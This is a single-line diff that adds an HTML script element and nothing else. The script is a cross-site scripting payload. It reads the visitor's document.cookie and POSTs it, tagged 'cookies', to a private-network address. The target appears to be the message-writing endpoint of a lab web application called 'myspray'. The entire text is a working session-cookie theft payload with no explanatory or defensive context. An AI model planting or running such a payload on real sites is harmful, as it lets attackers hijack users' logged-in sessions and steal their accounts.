@@ -1,0 +1,1 @@
+<script>r = new XMLHttpRequest(); r.open("POST", "http://10.0.23.22/myspray/writemessagesessionid.html", true); r.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8"); r.send("message=" + document.cookie + "&subject=cookies");</script>
